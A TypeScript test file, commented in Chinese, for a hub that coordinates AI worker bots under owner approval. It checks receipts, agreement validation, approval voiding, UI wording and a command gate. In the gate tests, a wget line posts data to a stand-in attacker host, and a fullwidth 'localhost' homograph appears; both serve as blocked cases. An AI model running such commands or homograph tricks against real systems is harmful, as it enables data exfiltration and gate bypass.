/**
 * P74r13 第 5 至 15 节的测试（第 1 至 4 节在 p74r13-launch-clause.test.ts 与 p74r13-chain-token-guard.test.ts）：
 *
 * 5 转交材料的提醒只在这件事还能转交时出现（与 forward 共用一个判断）；
 * 6 回执「核对」一行：任何一轮有退回就不能写「都通过」（五种组合逐字）；
 * 7 「怎样算做完」的拦截收窄：「发布后」「上线后」一类只在这一版约定写了对外发布时才拦；
 * 8 「写了时间」的判断不把「7 日留存」「3 点注意事项」「5 号位」当成时间；
 * 9 访问本机地址的判断：wget 必须写 --max-redirect=0；主机名含非 ASCII 字符不算本机；
 * 10 事情结束时，已经批准还没有用掉的普通审批同样作废（完成、停止、改派各一条）；
 * 11 总管守则里一处缺标点；
 * 12 交付卡的预览按钮只给最新的一次交付；
 * 13 发布审批上的几句话（标题、点按钮之后的两句、进度行、风险提示末句）；
 * 14 名字与岗位名称相同时不写括号；
 * 15 约定里的发布方式不重复写「发布前请你批准」（守则、工具说明、参数说明各加半句）。
 * 全部走真实的 Hub 或纯函数，时间用注入的假时钟（每次推进不超过 10 分钟）。
 */
import { describe, expect, it } from 'vitest';
import { buildDeliveryCard, deliveryCardView } from '../src/api/job-delivery-views.js';
import { classifyCommand } from '../src/gate/classify.js';
import type { GateContext } from '../src/gate/paths.js';
import { isLocalHttpUrl, wgetLocalOnly } from '../src/gate/local-address.js';
import { forwardReminderFor, FORWARD_REMINDER_TEXT } from '../src/job/forward-reminder.js';
import { computeReceiptRows, computeReceiptRowsFor, reviewRowValue } from '../src/job/receipt.js';
import { hasTimeMention } from '../src/job/time-mention.js';
import { hostCommandRiskNote } from '../src/gate/host-writable.js';
import { memberProjectDirs } from '../src/gate/gate-context.js';
import { approveWithoutRun } from './p74r18b-fixtures.js';
import { withLabel } from '../src/util/name-label.js';
import { newAgreementArgs } from './p72b-fixtures.js';
import { agreementIdIn } from './p73d-fixtures.js';
import { FIXTURE_LAUNCH_HOW, assignArgs, commitAndEnd, runningOf, tick, MINUTE } from './p74c-fixtures.js';
import { jobFix, lockedAndAwake, ownerSays, speak, type JobFix } from './p74b-fixtures.js';
import { bot, callTool, engineerSubmits, lastPacket, nextPacket, reviewerInfo, sectionOf, started, theJob, threadOf } from './p74d-fixtures.js';
import { PASS_ITEMS, chiefTurn, delivered, ownerTypes, reopenInfo } from './p74f-fixtures.js';
import { acceptedWithLaunch, launchArgs, submitLaunch } from './p74g-launch-fixtures.js';
import { threadOf as threadOfB } from './p74b-fixtures.js';

// ---------------------------------------------------------------------------
// 5 转交材料的提醒
// ---------------------------------------------------------------------------

/** 主人在这件事的主题里发话，总管拿到一个主人发起的回合（带这件事的主题）；与 p74r12 的写法一致。 */
async function ownerInTopic(fix: JobFix, topicId: string, text: string): Promise<void> {
  for (const who of [fix.engineer, fix.reviewer]) if (runningOf(fix, who.id)) await commitAndEnd(fix, who.id, { outcome: 'progress', summary: '先收尾' });
  if (runningOf(fix, fix.chief.id)) await speak(fix, bot(fix, fix.chief.id), '好。', { outcome: 'progress' });
  await ownerSays(fix, topicId, `@老大 ${text}`);
  for (let i = 0; i < 8 && !runningOf(fix, fix.chief.id); i += 1) await tick(fix, 5 * MINUTE);
  expect(runningOf(fix, fix.chief.id), '主人在主题里发话之后总管应该拿到一个回合').toBeDefined();
}

/** 只改「这次做」的修订参数（进行中的事要写 continuing、paused）。 */
const reviseArgs = (agreementId: string) => ({
  mode: 'revise', agreementId, changeNote: '限 60 人', scopeIn: ['报价列表页', '手动刷新，名额限 60 人'],
  continuing: ['报价列表页'], paused: ['名额相关的部分'], fallback: '如果只是文案说法，回复「不变」，我保留第 1 版。',
});

describe('5 转交材料的提醒只在这件事还能转交时出现', () => {
  it('待你验收：修订成功的返回文字没有提醒，照做 forward 也会被拒（两处是同一个判断）', async () => {
    const { fix, job } = await delivered();
    expect(theJob(fix).state).toBe('awaiting_owner');
    await ownerInTopic(fix, job.topicId, '活动文案：限 60 人');
    const result = await callTool(fix, fix.chief, 'hub_agreement_submit', { mode: 'revise', agreementId: job.agreementId, changeNote: '限 60 人',
      scopeIn: ['报价列表页', '手动刷新，名额限 60 人'], continuing: ['报价列表页'], paused: ['名额相关的部分'] });
    expect(result, JSON.stringify(result)).toMatchObject({ ok: true });
    expect(result.text).not.toContain(FORWARD_REMINDER_TEXT);
    expect(result.text).not.toContain('forward');
    const forwarded = await callTool(fix, fix.chief, 'hub_job_manage', { mode: 'forward', jobId: job.id, title: '活动文案', text: '限 60 人' });
    expect(forwarded.ok).toBe(false);
  });

  it('执行中：有提醒；返工中：有提醒', async () => {
    const { fix, job } = await started();
    await ownerInTopic(fix, job.topicId, '活动文案：限 60 人');
    const wake = runningOf(fix, fix.chief.id)!;
    expect(forwardReminderFor(fix.ctx, wake, job.agreementId)).toBe(FORWARD_REMINDER_TEXT);
    // 同一件事改成返工中（只改状态，其余不动）：仍有提醒。
    fix.ctx.store.table('jobs').patch(job.id, { state: 'rework', unmet: [{ no: 1, problem: '需要改', fixTo: '改成限 60 人' }] });
    expect(theJob(fix).state).toBe('rework');
    expect(forwardReminderFor(fix.ctx, wake, job.agreementId)).toBe(FORWARD_REMINDER_TEXT);
    // 改回待你验收：没有提醒。
    fix.ctx.store.table('jobs').patch(job.id, { state: 'awaiting_owner', unmet: [] });
    expect(forwardReminderFor(fix.ctx, wake, job.agreementId)).toBe('');
  });
});

// ---------------------------------------------------------------------------
// 6 回执「核对」一行
// ---------------------------------------------------------------------------

describe('6 回执「核对」一行：任何一轮有退回就不能写「都通过」', () => {
  const row = (input: { reviewRounds: number; firstRoundUnmet: number; returnedRounds: number; ownerReturned?: number }) =>
    computeReceiptRows({ firstLockedAt: 0, acceptedAt: 3_600_000, disturbed: 1, answered: 0, versionNo: 1, ...input }).find(item => item.label === '核对')!.value;

  it('只核对了 1 轮并通过：1 轮，一次通过', () => {
    expect(row({ reviewRounds: 1, firstRoundUnmet: 0, returnedRounds: 0 })).toBe('1 轮，一次通过');
  });
  it('整件事的第 1 轮有退回、其余轮都没有：{n} 轮，第 1 轮退回 {k} 条', () => {
    expect(row({ reviewRounds: 3, firstRoundUnmet: 2, returnedRounds: 1 })).toBe('3 轮，第 1 轮退回 2 条');
  });
  it('有退回的不是第 1 轮（审查记录里复现的那一种，主人退回之后的阶段里判了不符）：{n} 轮，其中 {r} 轮有退回，不写「都通过」', () => {
    expect(row({ reviewRounds: 3, firstRoundUnmet: 0, returnedRounds: 1, ownerReturned: 1 })).toBe('3 轮，其中 1 轮有退回；你指出不符 1 次');
  });
  it('有退回的轮不止一轮：{n} 轮，其中 {r} 轮有退回', () => {
    expect(row({ reviewRounds: 4, firstRoundUnmet: 1, returnedRounds: 2 })).toBe('4 轮，其中 2 轮有退回');
  });
  it('多轮、没有任何一轮有退回：{n} 轮，都通过', () => {
    expect(row({ reviewRounds: 2, firstRoundUnmet: 0, returnedRounds: 0 })).toBe('2 轮，都通过');
    expect(reviewRowValue({ reviewRounds: 2, firstRoundUnmet: 0, returnedRounds: 0, ownerReturned: 1 })).toBe('2 轮，都通过；你指出不符 1 次');
  });
  it('没有核对：无', () => {
    expect(row({ reviewRounds: 0, firstRoundUnmet: 0, returnedRounds: 0 })).toBe('无');
  });

  it('读存储：三轮核对里只有中间一轮判了不符，回执写「3 轮，其中 1 轮有退回」', async () => {
    const { fix, job } = await delivered();
    const reviews = fix.ctx.store.table('jobReviews').list(item => item.jobId === job.id);
    expect(reviews).toHaveLength(1);
    const pass = reviews[0]!;
    const unmet = { ...pass, id: 'jrv_r13aaaa001', createdAt: pass.createdAt + 1, round: 2,
      items: pass.items.map((item, index) => index === 0 ? { ...item, verdict: 'unmet' as const, note: '没有写失败提示' } : item) };
    const again = { ...pass, id: 'jrv_r13aaaa002', createdAt: pass.createdAt + 2, round: 3 };
    fix.ctx.store.table('jobReviews').put(unmet);
    fix.ctx.store.table('jobReviews').put(again);
    const rows = computeReceiptRowsFor(fix.ctx, theJob(fix));
    expect(rows.find(item => item.label === '核对')!.value).toBe('3 轮，其中 1 轮有退回');
  });
});

// ---------------------------------------------------------------------------
// 7 「怎样算做完」的拦截收窄
// ---------------------------------------------------------------------------

const OK_ITEMS = ['打开页面能看到今天的报价', '点刷新后数据更新', '接口失败时有提示'];
const REFUSAL = (index: number) => `约定内容无效：doneWhen[${index}]：这一条说的是验收之后才发生的事。「怎样算做完」的每一条都要在交付核对时就能判断；对外发布写在 launch 里，不写进这里。`;

/** 主人说一句话之后总管新建一份约定（不要求成功），返回工具结果。 */
async function chiefSubmitsNew(fix: JobFix, extra: Record<string, unknown>) {
  await ownerSays(fix, fix.chief.id, '帮我做个每日报价页');
  return callTool(fix, bot(fix, fix.chief.id), 'hub_agreement_submit', newAgreementArgs({ title: '会员定价页', ...extra }));
}

describe('7 「怎样算做完」的拦截收窄', () => {
  it('没有对外发布的约定里，「测试环境发布后冒烟通过」「文档写明上线后如何回滚」等正常条目通过', async () => {
    for (const item of ['测试环境发布后冒烟通过', '文档写明上线后如何回滚', '灰度发布之后的监控指标列在文档里', '预发布以后页面能打开，附链接']) {
      const fix = await jobFix();
      const result = await chiefSubmitsNew(fix, { doneWhen: [OK_ITEMS[0], OK_ITEMS[1], item] });
      expect(result, `${item}：${JSON.stringify(result)}`).toMatchObject({ ok: true });
    }
  });

  it('写了对外发布的约定里，「发布后访客能打开页面」被拒，文字逐字', async () => {
    const fix = await jobFix();
    const result = await chiefSubmitsNew(fix, { doneWhen: [OK_ITEMS[0], '发布后访客能打开页面', OK_ITEMS[2]], launch: { how: FIXTURE_LAUNCH_HOW } });
    expect(result.ok).toBe(false);
    expect(result.error).toBe(REFUSAL(1));
  });

  it('六种「发布后」「上线后」说法：有对外发布的约定里各一条被拒，没有对外发布的约定里各一条通过', async () => {
    for (const phrase of ['发布后', '发布之后', '发布以后', '上线后', '上线之后', '上线以后']) {
      const withLaunch = await jobFix();
      const refused = await chiefSubmitsNew(withLaunch, { doneWhen: [OK_ITEMS[0], OK_ITEMS[1], `${phrase}页面能打开`], launch: { how: FIXTURE_LAUNCH_HOW } });
      expect(refused.error, phrase).toBe(REFUSAL(2));
      const without = await jobFix();
      const passed = await chiefSubmitsNew(without, { doneWhen: [OK_ITEMS[0], OK_ITEMS[1], `${phrase}页面能打开`] });
      expect(passed, `${phrase}：${JSON.stringify(passed)}`).toMatchObject({ ok: true });
    }
  });

  it('九种任何约定都拦的说法：没有对外发布的约定里照旧被拒', async () => {
    for (const phrase of ['验收后', '验收之后', '验收以后', '验收通过后', '验收通过之后', '验收完成后', '经你批准', '你批准后', '你批准之后']) {
      const fix = await jobFix();
      const result = await chiefSubmitsNew(fix, { doneWhen: [OK_ITEMS[0], `${phrase}页面能打开`, OK_ITEMS[2]] });
      expect(result.error, phrase).toBe(REFUSAL(1));
    }
  });
});

// ---------------------------------------------------------------------------
// 8 时间判断
// ---------------------------------------------------------------------------

describe('8 「写了时间」的判断', () => {
  it.each([
    '页面展示 7 日留存曲线', '文档列出 3 点注意事项', '首页轮播 5 号位换成新图', '支持 12 月份的账单', '按 2 号文件格式导出',
    '文档列出三点注意事项', '十二月份的账单能导出', '说明里写明 5 点建议',
  ])('不算写了时间：%s', text => {
    expect(hasTimeMention(text)).toBe(false);
  });

  it.each([
    '17号之前给我', '5 日前交付', '3 号上午交付', '11 月 5 日交付', '下午 3 点交付', '晚上八点之前给我', '18 点前交付', '3 点整', '3 点半前', '18 点 30 分交付',
    '11月17日前交付', '18:00 前交付', '3 天内给我', '周三前给我', '明天给我',
  ])('仍算写了时间：%s', text => {
    expect(hasTimeMention(text)).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// 9 本机地址
// ---------------------------------------------------------------------------

const gate: GateContext = { homeDir: '/hub/bots/b_0000000001', rootDir: '/hub', sharedDir: '/hub/shared', workDataAllowed: false, workDataPaths: ['/company'] };
const classOf = (command: string, ctx: GateContext = gate): string => classifyCommand(command, ctx).cls;

describe('9 访问本机地址的判断', () => {
  it('wget：写了 --max-redirect=0（或 --max-redirect 0）且地址全是本机才放行；没有这个选项照原来的判定', () => {
    for (const command of ['wget --max-redirect=0 --post-data=x http://127.0.0.1:8000/', 'wget --max-redirect 0 --post-data=x http://localhost:8000/x']) {
      expect(classOf(command), command).toBe('A');
      expect(classOf(command, { ...gate, sandboxed: true }), command).toBe('A');
    }
    for (const command of ['wget --post-data=x http://127.0.0.1:8000/', 'wget --max-redirect=5 --post-data=x http://127.0.0.1:8000/',
      'wget --max-redirect=0 --post-data=x http://evil.example/']) {
      expect(classOf(command), command).not.toBe('A');
    }
    expect(wgetLocalOnly(['--max-redirect=0', 'http://127.0.0.1:8000/'])).toBe(true);
    expect(wgetLocalOnly(['http://127.0.0.1:8000/'])).toBe(false);
  });

  it('curl 的规则不变：不带 --max-redirect 照常放行', () => {
    expect(classOf('curl -X POST http://127.0.0.1:8000/a -d x=1')).toBe('A');
  });

  it('主机名里有非 ASCII 字符（全角字母写的 localhost）不算本机；普通写法仍算', () => {
    expect(isLocalHttpUrl('http://ｌｏｃａｌｈｏｓｔ/')).toBe(false);
    expect(isLocalHttpUrl('http://localhost:8000/x')).toBe(true);
    expect(classOf('curl -X POST http://ｌｏｃａｌｈｏｓｔ:8000/ -d x=1')).not.toBe('A');
    expect(classOf('curl -X POST http://localhost:8000/ -d x=1')).toBe('A');
  });
});

// ---------------------------------------------------------------------------
// 10 事情结束时，已批准还没用掉的普通审批作废
// ---------------------------------------------------------------------------

/** 林舟在做这件事时提交一条普通命令的审批；tag 不同命令就不同。返回审批编号。 */
async function submitOrdinary(fix: JobFix, tag: string): Promise<string> {
  const base = launchArgs(fix) as { payload: Record<string, unknown> };
  const before = new Set(fix.ctx.store.table('approvals').list().map(item => item.id));
  const result = await callTool(fix, bot(fix, fix.engineer.id), 'hub_outbox_submit', {
    kind: 'run_command', why: `跑一次${tag}`, payload: { ...base.payload, args: [`work/${tag}.js`] } });
  expect(result, JSON.stringify(result)).toMatchObject({ ok: true });
  return fix.ctx.store.table('approvals').list().find(item => !before.has(item.id))!.id;
}

/** 断言一张已批准的审批已被作废：已过期加 voided、答复栏写原因、主人再批准不了、命令没有运行。 */
async function expectVoidedAfterApproval(fix: JobFix, id: string, reason: string): Promise<void> {
  expect(fix.ctx.store.table('approvals').get(id)).toMatchObject({ status: 'expired', voided: true, usedAt: null });
  expect(fix.ctx.store.table('inbox').list(row => row.type === 'approval' && row.refId === id)[0]).toMatchObject({ status: 'withdrawn', answer: reason });
  expect((await fix.hub.api.decideApproval(id, true)).ok).toBe(false);
  for (let i = 0; i < 3; i += 1) await tick(fix, 5 * MINUTE);
  expect(fix.ctx.exec.calls).toHaveLength(0);
  expect(fix.ctx.store.table('outbox').list(row => row.approvalId === id).every(row => row.status !== 'done')).toBe(true);
}

describe('10 事情结束时，已批准还没有用掉的普通审批同样作废', () => {
  it('验收通过：已批准还没执行的普通审批作废，答复栏与等主人处理的那种相同，命令执行不了', async () => {
    const s = await started();
    await engineerSubmits(s.fix, s.info);
    // P74r18a：执行者交回时，他此前提交的审批已由中心作废；这条测的是「验收时仍开着的审批」，所以审批在交回之后、回合结束之前提交（同一回合里的后续动作）。
    const id = await submitOrdinary(s.fix, 'a');
    await commitAndEnd(s.fix, s.fix.engineer.id, { outcome: 'progress', summary: '已交回' });
    const seen = reviewerInfo(await nextPacket(s.fix, s.fix.reviewer.id));
    expect(await callTool(s.fix, bot(s.fix, s.fix.reviewer.id), 'hub_job_work', { mode: 'review', jobId: seen.jobId, items: PASS_ITEMS })).toMatchObject({ ok: true });
    await commitAndEnd(s.fix, s.fix.reviewer.id, { outcome: 'progress', summary: '核对通过' });
    // 提交之后到现在已经过了几次调度，这条命令此刻还是待审批；主人批准、还没有调度运行时验收。
    // P74r18b 同步（本节三条同）：构造「已批准、还没有执行」的状态，只记下批准的决定（界面入口会立刻开始执行，见 p74r18b-fixtures.ts）。
    expect(await approveWithoutRun(s.fix, id)).toMatchObject({ ok: true });
    expect(s.fix.ctx.store.table('approvals').get(id)).toMatchObject({ status: 'approved', usedAt: null });
    expect(await s.fix.hub.api.acceptJob({ jobId: theJob(s.fix).id, stage: theJob(s.fix).stage })).toMatchObject({ ok: true });
    await expectVoidedAfterApproval(s.fix, id, '这件事已完成，这条审批不再需要，已作废');
  });

  it('停止：已批准还没执行的普通审批作废，答复栏写「已停止」', async () => {
    const { fix, job } = await started();
    const id = await submitOrdinary(fix, 'a');
    expect(await approveWithoutRun(fix, id)).toMatchObject({ ok: true });
    expect(fix.ctx.store.table('approvals').get(id)).toMatchObject({ status: 'approved', usedAt: null });
    await commitAndEnd(fix, fix.engineer.id, { outcome: 'progress', summary: '继续' });
    await ownerSays(fix, fix.chief.id, '这件事先不做了');
    const result = await callTool(fix, bot(fix, fix.chief.id), 'hub_job_manage', { mode: 'stop', jobId: job.id, reason: '你说这件事先不做了' });
    expect(result, JSON.stringify(result)).toMatchObject({ ok: true });
    await expectVoidedAfterApproval(fix, id, '这件事已停止，这条审批不再需要，已作废');
  });

  it('改派：被换下的执行者提交、已批准还没执行的审批作废，答复栏写「已改派」', async () => {
    const { fix, job } = await started(['小周']);
    const id = await submitOrdinary(fix, 'a');
    expect(await approveWithoutRun(fix, id)).toMatchObject({ ok: true });
    await commitAndEnd(fix, fix.engineer.id, { outcome: 'progress', summary: '继续' });
    await ownerSays(fix, fix.chief.id, '换小周来做');
    const swapped = await callTool(fix, bot(fix, fix.chief.id), 'hub_job_manage', { mode: 'reassign', jobId: job.id, executor: '小周' });
    expect(swapped, JSON.stringify(swapped)).toMatchObject({ ok: true });
    await expectVoidedAfterApproval(fix, id, '这件事已改派，这条审批不再需要，已作废');
  });

  it('反例：已经使用的审批不动', async () => {
    const { fix } = await started();
    const id = await submitOrdinary(fix, 'a');
    fix.ctx.store.table('approvals').patch(id, { status: 'used', usedAt: fix.ctx.clock.now() });
    const { voidJobApprovals } = await import('../src/job/void-job-approvals.js');
    expect(voidJobApprovals(fix.ctx, theJob(fix), 'done', fix.ctx.clock.now())).toBe(0);
    expect(fix.ctx.store.table('approvals').get(id)!.status).toBe('used');
  });
});

// ---------------------------------------------------------------------------
// 11、15 总管守则和工具说明
// ---------------------------------------------------------------------------

describe('11、15 总管守则和工具说明', () => {
  it('守则规则 6 之二：括号后补了句号，一句话读得通', async () => {
    const fix = await jobFix();
    const packet = await lockedAndAwake(fix);
    expect(packet).toContain('某某没有岗位名称就不写括号。理由只写角色对应和手上空不空。');
    expect(packet).not.toContain('就不写括号理由只写');
  });

  it('守则讲 launch 的那句、工具说明、参数说明各加了半句：不写「发布前请你批准」这类话', async () => {
    const fix = await jobFix();
    const packet = await lockedAndAwake(fix);
    const half = '只写发布到哪里、用什么方式，不写「发布前请你批准」这类话（约定卡上中心会加）';
    expect(packet).toContain(`在约定的 launch 里写清发布到哪里、用什么方式（一行字，${half}）`);
    const tool = fix.hub.tools().find(item => item.name === 'hub_agreement_submit')!;
    const text = JSON.stringify(tool);
    // 工具说明里那一句（description）和 launch.how 的参数说明（schema 里 launch.how 的 description）。
    expect(text).toContain(`一行白话，不含内部名称；${half}`);
    expect(text).toContain(`用白话写，不含内部名称；${half}`);
  });

  it('守则和工具说明讲 amend 能改什么的地方同步：对外发布一项不能用 amend', async () => {
    const fix = await jobFix();
    const packet = await lockedAndAwake(fix);
    expect(packet).toContain('对外发布（launch）一项加上、改写、去掉都不能用 amend，一律用 mode revise 请主人确认。');
    const text = JSON.stringify(fix.hub.tools().find(item => item.name === 'hub_agreement_submit'));
    expect(text).toContain('amend 不能改待定项、这次做、这次不做、怎样算做完和对外发布 launch，这几项一律用 revise');
  });
});

// ---------------------------------------------------------------------------
// 12 交付卡的预览按钮
// ---------------------------------------------------------------------------

describe('12 交付卡的预览按钮只给最新的一次交付', () => {
  it('纯函数：不是最新一次交付的卡没有预览；省略时照旧', () => {
    const base = {
      jobId: 'job_0000000001', stage: 1, jobState: 'rework' as const, currentStage: 2, agreementTitle: '会员定价页', versionNo: 1, reviews: [], submissions: [],
      checks: [], deliveredAt: 1, acceptedAt: null, ownerReturn: { stage: 1, at: 2, items: [{ no: 3, text: '甲', problem: '问题', fixTo: '改法' }], missed: '漏了', messageId: 'm1' },
      pendingVersionNo: null, hasPreview: true, timezone: 'Asia/Shanghai',
    };
    expect(buildDeliveryCard({ ...base, isLatestDelivery: false }).actions.preview).toBe(false);
    expect(buildDeliveryCard({ ...base, isLatestDelivery: true }).actions.preview).toBe(true);
    expect(buildDeliveryCard(base).actions.preview).toBe(true);
  });

  it('返工后有两张交付卡：旧的「未通过」那张预览为假，新的那张为真；只有一次交付时照旧', async () => {
    const { fix, job } = await delivered();
    // 只有一次交付：这张卡有预览。
    expect(deliveryCardView(fix.ctx, `delivery:${job.id}#1`)!.actions.preview).toBe(true);
    // 主人指出不符、总管退回返工（真实流程）。
    await ownerTypes(fix, job.topicId, '第 3 条不对：失败时页面没有任何提示');
    const seen = reopenInfo(await chiefTurn(fix));
    expect(await callTool(fix, bot(fix, fix.chief.id), 'hub_job_manage', { mode: 'reopen', jobId: seen.jobId,
      items: [{ no: seen.nos[2]!, problem: '失败时页面没有任何提示', fixTo: '断开接口后页面显示「加载失败」' }], missed: '核对时只看了正常情况' })).toMatchObject({ ok: true });
    // 第二次交付（在记录上造出第 2 阶段的交回和交付记录，等价于返工后重新交付）。
    const now = theJob(fix);
    const submission = fix.ctx.store.table('jobSubmissions').list(row => row.jobId === job.id).at(-1)!;
    fix.ctx.store.table('jobSubmissions').put({ ...submission, id: 'jsb_r13second1', stage: 2, createdAt: submission.createdAt + 1 });
    fix.ctx.store.table('jobs').patch(job.id, { state: 'awaiting_owner', delivery: { ...now.delivery!, stage: 2, rev: 0, cardMessageId: null, checks: [] } });
    const oldCard = deliveryCardView(fix.ctx, `delivery:${job.id}#1`)!;
    const newCard = deliveryCardView(fix.ctx, `delivery:${job.id}#2`)!;
    expect(oldCard).toMatchObject({ phase: 'returned' });
    expect(oldCard.actions.preview).toBe(false);
    expect(newCard.actions.preview).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// 13 发布审批上的几句话
// ---------------------------------------------------------------------------

const LAUNCH_SENTENCE = `按约定对外发布：${FIXTURE_LAUNCH_HOW}`;

describe('13 发布审批上的几句话', () => {
  it('审批的标题、卡片第一行、「待你处理」条目标题都用「按约定对外发布：{发布方式}」，不再是通用句', async () => {
    const { fix } = await acceptedWithLaunch();
    const { approval } = await submitLaunch(fix);
    expect(fix.ctx.store.table('approvals').get(approval.id)!.actionText).toBe(LAUNCH_SENTENCE);
    const card = fix.ctx.store.table('inbox').list(row => row.type === 'approval' && row.refId === approval.id)[0]!;
    expect(card.title).toBe(`批准：${LAUNCH_SENTENCE}`);
    expect(card.body.split('\n')[0]).toBe(LAUNCH_SENTENCE);
    const view = fix.hub.api.inbox().items.find(row => row.approvalId === approval.id)!;
    expect(view.approval!.actionText).toBe(LAUNCH_SENTENCE);
    expect(card.body).not.toContain('请中心代为运行一条命令');
  });

  it('普通审批不变：仍是通用句', async () => {
    const { fix } = await started();
    const id = await submitOrdinary(fix, 'a');
    expect(fix.ctx.store.table('approvals').get(id)!.actionText).toBe('请中心代为运行一条命令');
    const card = fix.ctx.store.table('inbox').list(row => row.type === 'approval' && row.refId === id)[0]!;
    expect(card.body.split('\n')[0]).toBe('请中心代为运行一条命令');
    expect(await fix.hub.api.decideApproval(id, false)).toMatchObject({ ok: true });
    const lines = threadOfB(fix.ctx, fix.chief.id).filter(row => row.from === 'hub' && row.kind === 'system').map(row => row.text);
    expect(lines).toContain('你拒绝了：请中心代为运行一条命令');
  });

  it('点「暂不发布」：对话里那一句写「你选择了暂不发布：{同上那一句话}」；进度行写「你暂不发布」，状态仍是已完成', async () => {
    const { fix, job } = await acceptedWithLaunch();
    const { approval } = await submitLaunch(fix);
    expect(await fix.hub.api.decideApproval(approval.id, false)).toMatchObject({ ok: true });
    const lines = threadOf(fix.ctx, fix.chief.id).filter(row => row.from === 'hub' && row.kind === 'system').map(row => row.text);
    expect(lines).toContain(`你选择了暂不发布：${LAUNCH_SENTENCE}`);
    expect(lines.some(text => text.startsWith('你拒绝了'))).toBe(false);
    expect(theJob(fix)).toMatchObject({ state: 'done', launch: { state: 'declined', endedBy: 'owner' } });
    // 进度行：界面把 delayNote 接在「在等：」后面，没人在等时看不到；所以状态小标签里也写上，状态仍是已完成。
    const progress = fix.hub.api.thread(job.topicId).progress!;
    expect(progress).toMatchObject({ stateLabel: '已完成（你暂不发布）', stateTone: 'ok', waitingOn: null, delayNote: '你暂不发布' });
  });

  it('中心结束的「暂不发布」（例如审批过期）：状态小标签写「已完成（没有发布）」', async () => {
    const { fix, job } = await acceptedWithLaunch();
    const { approval } = await submitLaunch(fix);
    fix.ctx.store.table('approvals').patch(approval.id, { expiresAt: fix.ctx.clock.now() + MINUTE });
    await tick(fix, 2 * MINUTE);
    expect(fix.hub.api.thread(job.topicId).progress).toMatchObject({ stateLabel: '已完成（没有发布）', delayNote: '没有发布' });
  });

  it('点「批准发布」：对话里那一句写「你批准了发布：{同上那一句话}」', async () => {
    const { fix } = await acceptedWithLaunch();
    const { approval } = await submitLaunch(fix);
    fix.ctx.exec.set('node', ['work/go-live.js'], { code: 0, stdout: '已上线', stderr: '', timedOut: false });
    expect(await fix.hub.api.decideApproval(approval.id, true)).toMatchObject({ ok: true });
    const lines = threadOf(fix.ctx, fix.chief.id).filter(row => row.from === 'hub' && row.kind === 'system').map(row => row.text);
    expect(lines).toContain(`你批准了发布：${LAUNCH_SENTENCE}`);
  });

  it('风险提示末句改为「不确定这条命令的作用时，请拒绝。」，前两句不变', async () => {
    // P74r18b 同步（4.2）：这句话改由可写清单生成，点名员工、按这位员工有没有项目写「项目文件夹」；末句不变。
    const { fix } = await acceptedWithLaunch();
    const { approval } = await submitLaunch(fix);
    const executor = bot(fix, fix.engineer.id);
    const note = hostCommandRiskNote(executor.name, memberProjectDirs(fix.ctx, executor.id).length > 0);
    expect(note).toMatch(/^批准后这条命令只能写入：林舟的文件夹、共享文件夹、(项目文件夹、)?本机临时文件夹；可以联网。不确定这条命令的作用时，请拒绝。$/);
    expect(fix.ctx.store.table('approvals').get(approval.id)!.riskNote).toBe(note);
    const card = fix.ctx.store.table('inbox').list(row => row.type === 'approval' && row.refId === approval.id)[0]!;
    expect(card.body.split('\n')[2]).toBe(note);
    expect(card.body).not.toContain('看不懂就拒绝');
  });
});

// ---------------------------------------------------------------------------
// 14 「评审员（评审员）」这类重复
// ---------------------------------------------------------------------------

describe('14 名字与岗位名称相同时不写括号', () => {
  it('统一函数：相同（去掉首尾空白后）、没有岗位、空岗位只写名字；不同的写括号', () => {
    expect(withLabel('评审员', '评审员')).toBe('评审员');
    expect(withLabel('评审员', ' 评审员 ')).toBe('评审员');
    expect(withLabel('林舟', null)).toBe('林舟');
    expect(withLabel('林舟', '  ')).toBe('林舟');
    expect(withLabel('林舟', '工程师')).toBe('林舟（工程师）');
  });

  it('派活后主题里那句话、总管唤醒包里的在岗员工清单：名字就叫「工程师」时不写重复的括号', async () => {
    const fix = await jobFix();
    fix.ctx.store.table('bots').patch(fix.engineer.id, { name: '工程师' });
    const packet = await lockedAndAwake(fix);
    // 在岗员工清单：有岗位名称时写「名字（岗位名称，岗位类别，在办…）」；名字与岗位名称相同时省去岗位名称。
    expect(packet).toContain('工程师（执行，在办 0 件）');
    expect(packet).not.toContain('工程师（工程师');
    const id = agreementIdIn(packet);
    expect(await callTool(fix, fix.chief, 'hub_job_manage', assignArgs(id, { executor: '工程师' }))).toMatchObject({ ok: true });
    const job = fix.ctx.store.table('jobs').list()[0]!;
    const said = threadOf(fix.ctx, job.topicId).find(row => row.from === fix.chief.id && row.kind === 'reply' && row.refId === job.id)!;
    expect(said.text).toBe('这件事由工程师执行，评审甲在交付前对照约定核对。我已把你的原话、草图和约定第 1 版作为文件交给工程师。');
  });

  it('试用反馈两句：名字与岗位名称相同时不写括号', async () => {
    const { executorTrialText, reviewerTrialText } = await import('../src/job/trial.js');
    expect(executorTrialText({ name: '工程师', post: '工程师', submits: 1, firstUnmet: 0, flagged: 0 })).toBe('工程师的第一件事做完了：交回 1 次，第一次就全部符合，你验收时没有指出不符。');
    expect(reviewerTrialText({ name: '评审员', post: '评审员', rounds: 1, flagged: 0 })).toBe('评审员的第一件事做完了：核对 1 轮，你验收时没有发现漏判。');
    expect(reviewerTrialText({ name: '评审甲', post: '评审员', rounds: 1, flagged: 0 })).toBe('评审甲（评审员）的第一件事做完了：核对 1 轮，你验收时没有发现漏判。');
  });
});

// 以下只为让未使用的导入在类型检查里有出处（这些帮手在个别测试里按需使用）。
void lastPacket; void sectionOf;
